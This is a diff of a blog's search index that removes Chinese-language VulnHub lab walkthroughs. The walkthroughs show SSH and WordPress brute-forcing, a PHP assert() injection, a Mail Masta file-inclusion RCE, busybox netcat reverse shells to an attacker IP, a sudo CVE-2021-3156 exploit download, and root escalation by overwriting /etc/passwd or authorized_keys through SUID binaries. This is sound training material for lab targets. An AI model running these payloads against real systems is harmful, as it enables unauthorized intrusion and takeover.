@@ -1,334 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Assertion101 Walkthrough</title>
-    <url>/2025/03/22/Assertion101/</url>
-    <content><![CDATA[<h1 id="Assertion-1-0-1-Walkthrough"><a href="#Assertion-1-0-1-Walkthrough" class="headerlink" title="Assertion: 1.0.1 Walkthrough"></a>Assertion: 1.0.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/assertion-101,495/#top">Assertion: 1.0.1</a></p>
-<p><img src="/picture/image-20250324142845574.png" alt="image-20250324142845574"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.99</span><br></pre></td></tr></table></figure>
-
-<p>发现 22、80 端口</p>
-<p><img src="/picture/image-20250324143056755.png" alt="image-20250324143056755"></p>
-<p>对开放的端口做应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80 -A -T4 172.16.33.99</span><br></pre></td></tr></table></figure>
-
-<p>发现 SSH 和 Apache 服务版本较高，漏洞较少且利用复杂，暂不考虑</p>
-<p><img src="/picture/image-20250324143630111.png" alt="image-20250324143630111"></p>
-<p>先来看 22 端口，尝试直接连接以及弱口令能不能泄露机密信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.99 </span><br></pre></td></tr></table></figure>
-
-<p>很遗憾，失败了，什么也没泄露</p>
-<p><img src="/picture/image-20250324143811794.png" alt="image-20250324143811794"></p>
-<p>试试 SSH 爆破 root 密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.99</span><br></pre></td></tr></table></figure>
-
-<p>没爆破出来</p>
-<p>好吧，看来 22 端口暂时无从下手了，再来看看 80 端口</p>
-<p>进行下 WEB 目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.99  </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/wordlists/dirb/big.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.99/ -w /usr/share/seclists/Discovery/Web-Content/big.txt </span><br></pre></td></tr></table></figure>
-
-<p>说实话，后面几个加了字典的还没不加字典的第一个扫出来的多</p>
-<p><img src="/picture/image-20250324144159467.png" alt="image-20250324144159467"></p>
-<p>访问页面，你会发现他的超链接做的挺乱的，就以 about 那个页面来说，网站上有三种通向该页面的超链接，但也只有前两种有用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=about</span><br><span class="line">http://172.16.33.99/about.php</span><br><span class="line">http://172.16.33.99/about.html</span><br></pre></td></tr></table></figure>
-
-<p>探寻页面一会后，你会发现，home 、about us、schedule、gallery、blog、contains 这几个页面站内所有链接的 action 都是 # ，说明是无用链接</p>
-<p><img src="/picture/image-20250324144732104.png" alt="image-20250324144732104"></p>
-<p>再来看看 &#x2F;pages 目录，发现刚好与网页各个展示内容对应</p>
-<p><img src="/picture/image-20250324145849180.png" alt="image-20250324145849180"></p>
-<p>结合 <code>http://172.16.33.99/index.php?page=about</code> ，可以大胆猜测一下，是否存在文件包含？</p>
-<p>尝试包含 &#x2F;etc&#x2F;passwd 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.99/index.php?page=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>噢？看来是对关键词做了过滤</p>
-<p><img src="/picture/image-20250324150045976.png" alt="image-20250324150045976"></p>
-<p>生成长度为一的关键词字典</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -f /usr/share/crunch/charset.lst symbols-all &gt; s.txt </span><br></pre></td></tr></table></figure>
-
-<p>测试一下有哪些关键词被过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w s.txt:VAL -u http://172.16.33.99/index.php?page=VAL -fr &quot;File does not exist&quot;</span><br></pre></td></tr></table></figure>
-
-<p>嗯？还有意外之喜，单引号既然会引起服务端错误，要么是 SQL 注入，要么是命令注入</p>
-<p>这里显然不是 SQL 注入，因为响应的页面为空，执行 <code>&#39; or 1=1 #</code> 的响应也为空</p>
-<p><img src="/picture/image-20250324151407818.png" alt="image-20250324151407818"></p>
-<p>那么就是关于 PHP 内容的命令注入，我们可以将核心代码看成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$page</span>&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>输入的单引号会破坏原语句的结构，导致响应 500</p>
-<p>尝试插入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;id&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>语句就变成了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;&#x27;and die(system(&quot;</span>id<span class="string">&quot;)) or &#x27;&#x27;,&#x27;.&#x27;)===false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Not so easy brother!&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>就可以执行命令</p>
-<p><img src="/picture/image-20250324152258829.png" alt="image-20250324152258829"></p>
-<p>能执行命令就简单了，直接使用 busybox 反弹 shell </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and die(system(&quot;busybox nc 10.8.0.90 1234 -e /bin/bash&quot;)) or &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<p><img src="/picture/image-20250324152503892.png" alt="image-20250324152503892"></p>
-<p>接下来是提权，查看 sudo 版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>
-
-<p>1.8.21 处在 1.8.2 ~ 1.8.31p2 直接，可以使用 CVE-2021-3156 提权</p>
-<p><img src="/picture/image-20250324152621815.png" alt="image-20250324152621815"></p>
-<p>切换到 &#x2F;tmp 目录，将 exp 上传至目标主机，赋予可执行权限后执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
-
-<p>提权成功</p>
-<p><img src="/picture/image-20250324152956639.png" alt="image-20250324152956639"></p>
-<p>切换至 cd 目录，获得 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root </span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250324153219933.png" alt="image-20250324153219933"></p>
-<p>当然，也可以通过 aria2c 的 SUID 权限提权，该文件与 wget 相似，可以远程下载文件</p>
-<p><img src="/picture/image-20250324153523310.png" alt="image-20250324153523310"></p>
-<p>那么就将目标主机上的 &#x2F;etc&#x2F;passwd 文件拷贝到宿主机，将 root 密码更改为已知，再通过 aria2c 远程下载并覆盖原 &#x2F;etc&#x2F;passwd</p>
-<p>由于具有 SUID 的文件运行时会获得 root 权限，所以可以允许修改 &#x2F;etc&#x2F;passwd </p>
-<p>生成已知的密码哈希（123）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
-
-<p>更改后的 passwd</p>
-<p><img src="/picture/image-20250324154812796.png" alt="image-20250324154812796"></p>
-<p>执行下载命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -o &quot;/etc/passwd&quot; &quot;http://10.8.0.90/passwd&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>
-
-<p>直接使用 su 提权</p>
-<p><img src="/picture/image-20250324160332053.png" alt="image-20250324160332053"></p>
-<p>也可以制作 SSH 公钥直接写入 root 账号根目录下，然后我在用我的私钥直接和目标主机服务端 SSH 建立连接</p>
-<p>生成 ssh 公私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250324161554295.png" alt="image-20250324161554295"></p>
-<blockquote>
-<p>直接一路回车就行，生成的公私钥在 .ssh 目录</p>
-</blockquote>
-<p><img src="/picture/image-20250324160802504.png" alt="image-20250324160802504"></p>
-<p>将公钥上传至 root 账号根目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aria2c -d /root/.ssh/ -o authorized_keys &quot;http://10.8.0.90/id_rsa.pub&quot; --allow-overwrite=true</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250324161339594.png" alt="image-20250324161339594"></p>
-<p>再宿主机 .ssh 目录使用 SSH 远程登陆</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/.ssh]</span><br><span class="line">└─$ ssh root@172.16.33.99   </span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<p><img src="/picture/image-20250324161449534.png" alt="image-20250324161449534"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Born2root Walkthrough</title>
-    <url>/2025/03/23/Born2root/</url>
-    <content><![CDATA[<h1 id="Born2root-Walkthrough"><a href="#Born2root-Walkthrough" class="headerlink" title="Born2root Walkthrough"></a>Born2root Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[Born2Root: 1](<a href="https://www.vulnhub.com/entry/born2root-1,197/">Born2Root: 1 ~ VulnHub</a>)</p>
-<p><img src="/picture/image-20250323173030438.png" alt="image-20250323173030438"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.98  </span><br></pre></td></tr></table></figure>
-
-<p>发现 22，80，111，38734 端口</p>
-<p><img src="/picture/image-20250323103653485.png" alt="image-20250323103653485"></p>
-<p>在进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80,111,38734 -A -T4 172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>也是发现了 80 端口的 robots.txt ，同时发现高位端口的服务还是不明</p>
-<p><img src="/picture/image-20250323103810069.png" alt="image-20250323103810069"></p>
-<p>先来看看 22 端口，直接使用 ssh 客户端连接，尝试弱口令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.98  </span><br></pre></td></tr></table></figure>
-
-<p>可惜的是连接上了 ssh ，并未泄露什么信息，同时弱口令也行不通</p>
-<p><img src="/picture/image-20250323104428522.png" alt="image-20250323104428522"></p>
-<p>再来看看 80 端口，先前 nmap 扫到了 robots.txt ，直接访问是两个网站 </p>
-<p>&#x2F;wordpress-blog 纯是干扰信息，逗你玩的</p>
-<p><img src="/picture/image-20250323104615308.png" alt="image-20250323104615308"></p>
-<p>&#x2F;files 也是空的</p>
-<p><img src="/picture/image-20250323104659011.png" alt="image-20250323104659011"></p>
-<p>那么扫描目录看看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.98/</span><br></pre></td></tr></table></figure>
-
-<p>换了好些字典，也只扫出来了 &#x2F;files ，&#x2F;icons，&#x2F;manual 和 robots.txt </p>
-<p>在 &#x2F;icons 下发现了 VDSoyuAXiO.txt 可疑文件，访问发现是 RSA PRIVATE KEY，但是并不知道这个 key 的用户名是谁</p>
-<p><img src="/picture/image-20250323105621435.png" alt="image-20250323105621435"></p>
-<p>而 &#x2F;manual 是 Apache HTTP 服务器 2.4 的文档，没有提供用户名信息，那我们直接访问 ip 试试看</p>
-<p>发现了三个用户名：martin，hadi，jimmy 和邮箱地址 <code>martin@secretsec.com</code>  </p>
-<p><img src="/picture/image-20250323110327281.png" alt="image-20250323110327281"></p>
-<p>将各用户名配合泄露的密钥尝试 ssh 登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i private.key martin@172.16.33.98</span><br><span class="line">ssh -i private.key hadi@172.16.33.98</span><br><span class="line">ssh -i private.key jimmy@172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>可惜都失败了，80 端口似乎没有路子了，再来看看 111 端口，尝试登陆和用户名登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient 172.16.33.98</span><br><span class="line">rpcclient --user jimmy 172.16.33.98</span><br><span class="line">rpcclient --user hadi 172.16.33.98</span><br><span class="line">rpcclient --user martin 172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>都报了 Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED 错，意思是目标主机虽然开启了 111 端口 NFS 服务，但不接受登录请求</p>
-<p><img src="/picture/image-20250323154952588.png" alt="image-20250323154952588"></p>
-<p>既然不让我们登陆，那我们拿他也没什么办法，那只能试试 SSH 密码爆破了，毕竟有三个用户名</p>
-<p>将三个用户名保存为用户名字典 user.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>s 参数会将用户名当成密码尝试</p>
-<p>r 会使用倒置的用户名当作密码尝试</p>
-<p>n 使用空密码</p>
-</blockquote>
-<p>密码字典也可以使用 cewl 在目标网站进行爬取后生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl 172.16.33.98 -m 4 -w pass.txt</span><br></pre></td></tr></table></figure>
-
-<p>开始密码爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P pass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>可惜没跑出来</p>
-<p><img src="/picture/image-20250323160928271.png" alt="image-20250323160928271"></p>
-<p>试试对 pass.txt 进行变形操作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat --stdout pass.txt -r /usr/share/hashcat/rules/combinator.rule -o newpass.txt</span><br></pre></td></tr></table></figure>
-
-<p>再使用新的密码跑一遍看看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P newpass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>密码为 hadi123 </p>
-<p><img src="/picture/image-20250323164351354.png" alt="image-20250323164351354"></p>
-<p>直接 ssh 登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh hadi@172.16.33.98</span><br></pre></td></tr></table></figure>
-
-<p>登陆成功</p>
-<p><img src="/picture/image-20250323162853128.png" alt="image-20250323162853128"></p>
-<p>接下来就是提权，比较搞的时，su 的密码也是 hadi123 ，直接就变成 root 了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250323172852355.png" alt="image-20250323172852355"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HAWordy Walkthrough</title>
-    <url>/2025/03/24/HAWordy/</url>
-    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
-<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
-
-<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>
-
-<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>
-
-<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
-<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
-<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
-<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
-<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
-<p>用户名确定，可以试试密码爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
-<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
-<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
-<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
-<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>
-
-<p>发现了一些目录：</p>
-<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
-<p>访问 readme ，只是一个下载引导页面</p>
-<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
-<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
-<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
-<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
-<p>再来看插件，分别是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>
-
-<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
-<p>看看能不能包含 apache 服务日志：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
-
-<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
-
-<p>成功执行</p>
-<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
-<p>尝试反弹 shell </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
-
-<p>同时开启 nc 监听：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
-
-<p>反弹成功</p>
-<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
-<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
-<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
-<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
-<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
-
-<p>启动接受服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>
-
-<p>在目标主机上执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>
-
-<p>接收成功，解压时发现需要密码</p>
-<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
-<p>将密码哈希保存为字典，使用 john 破译</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>
-
-<p>又没跑出密码，看来得在目标主机里找了（</p>
-<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
-<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>看到了一个有趣的东西：</p>
-<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
-<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>
-
-<p>利用成功</p>
-<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
-<p>接下来就是进入 root 目录获得最终 flag</p>
- <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
-<p>或者可以使用 cp 命令</p>
-<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
-
-<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
-<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p> 看来 secret.zip 是兔子洞，误导你的</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE 学习记录</title>
     <url>/2024/03/11/XXE%20exploit/</url>
     <content><![CDATA[<p>前言：</p>
@@ -577,6 +249,334 @@
         <tag>XXE</tag>
         <tag>ctfshow</tag>
         <tag>reverse shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Born2root Walkthrough</title>
+    <url>/2025/03/23/Born2root/</url>
